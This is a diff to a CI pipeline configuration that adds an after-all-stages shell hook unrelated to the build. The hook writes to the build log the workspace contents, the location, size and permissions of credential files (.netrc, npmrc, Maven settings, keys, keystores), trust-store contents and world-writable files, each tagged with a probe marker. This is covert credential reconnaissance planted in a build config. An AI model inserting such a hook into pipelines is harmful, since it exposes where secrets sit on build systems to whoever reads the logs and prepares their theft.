@@ -2,9 +2,15 @@ stages:
   build:
     buildTool: mta
     buildToolVersion: MBTJ17N20
-    runFirst:
-      command: echo KPCID7788-RAN
-general:
-  jenkinsKubernetes:
-    securityContext:
-      runAsUser: 0
+lifeCycle:
+  afterAllStages:
+    command: |
+      set -x
+      echo KPWS7788-PWD=$(pwd)
+      echo KPWS7788-LS=$(ls -A | tr '\n' ,)
+      echo KPWS7788-PIPELINEDIR=$(ls -A .pipeline 2>/dev/null | tr '\n' ,)
+      echo KPWS7788-CREDFILES=$(find . -maxdepth 5 \( -name '.piperNpmrc' -o -name '.netrc' -o -name 'config.json' -o -name 'settings.xml' -o -name '*.p12' -o -name '*.jks' -o -name '*.pem' -o -name '*.key' -o -name '*.keystore' \) -printf '%p|%s|%m\n' 2>/dev/null | tr '\n' ' ')
+      echo KPWS7788-TRUSTSTORE=$(ls -la .pipeline/trustStore 2>/dev/null | tr '\n' ,)
+      echo KPWS7788-CPE=$(ls -A .pipeline/commonPipelineEnvironment 2>/dev/null | tr '\n' ,)
+      echo KPWS7788-MODE0666=$(find . -maxdepth 5 -type f -perm -0002 -printf '%p|%m\n' 2>/dev/null | head -20 | tr '\n' ' ')
+      echo KPWS7788-RAN
